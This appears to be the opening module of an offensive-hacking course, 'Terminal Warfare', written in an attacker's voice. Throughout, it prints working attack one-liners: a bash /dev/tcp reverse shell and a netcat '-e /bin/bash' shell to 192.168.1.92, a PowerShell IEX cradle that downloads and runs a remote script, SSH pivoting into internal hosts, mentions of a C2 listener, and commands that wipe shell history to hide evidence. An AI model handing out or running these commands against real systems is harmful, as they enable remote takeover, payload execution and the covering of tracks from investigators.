Module 00 — Terminal Warfare

First Principle: The terminal is your weapon. Every command is a round.
Section 1: Shell Basics

Two shells matter: bash (Linux) and PowerShell (Windows). Know which to use when.

$ bash -i >& /dev/tcp/192.168.1.92/4444 0>&1
# Reverse shell one-liner. The classic.
PS> IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.92/a.ps1')
# PowerShell download cradle. Every Windows box has this.
PowerShell is signed by Microsoft. The defender's job is to decide if the SCRIPT is malicious, not if PowerShell itself is. Obfuscation buys time.
Section 2: Navigation

Know where you are. Know what's around you. Then move.

PS> pwd
C:\Users\gwu07
PS> ls
22nd-survey-division vader-fuzz modules MODULE_19_LOTL.md
PS> cd 22nd-survey-division\modules
# Now you're in the modules directory. Context is everything.
Section 3: Network Recon

Every open port is a conversation. Map your own surface before you scan others.

PS> ipconfig | findstr IPv4
192.168.1.92
192.168.56.1
PS> netstat -an | findstr LISTENING
0.0.0.0:1337 LISTENING
0.0.0.0:4443 LISTENING
0.0.0.0:8080 LISTENING
0.0.0.0:9090 LISTENING
4443 = C2 listener. 1337 = PostgreSQL. 8080 = Apache. Know what's running on your own machine.
Section 4: Process Check

See what's running. See what's hiding. Kill what needs killing.

PS> Get-Process | Sort-Object CPU -Descending | Select-Object -First 5
Name Id CPU
---- -- ---
python 31248 245.67
avp 4968 89.23
postgres 9180 45.12
python PID 31248 = C2 listener. avp = Kaspersky watching. Know your own processes.
Section 5: netcat — Swiss Army Knife

Bind shell. Reverse shell. File transfer. netcat does it all.

$ nc -lvnp 4444
listening on [any] 4444 ...
$ nc 192.168.1.92 4444 -e /bin/bash
# Target connects back. Shell established.
Section 6: ssh Tunneling

SSH is a tunnel, not just a shell. Route traffic through jumpboxes.

$ ssh -L 8080:internal.target.com:80 user@jumpbox
# Browse localhost:8080 → reaches internal.target.com:80
$ ssh -D 1080 user@jumpbox
# SOCKS5 proxy on localhost:1080. Route anything through it.
Section 7: History Poisoning

Every command is evidence. Leave nothing or leave lies.

PS> Set-PSReadlineOption -HistorySaveStyle SaveNothing
# PowerShell history disabled. No transcript written.
$ unset HISTFILE; HISTFILE=/dev/null; history -c
# bash history cleared. No .bash_history evidence.
The defender reads .bash_history and PowerShell transcripts. You leave nothing or you leave lies.
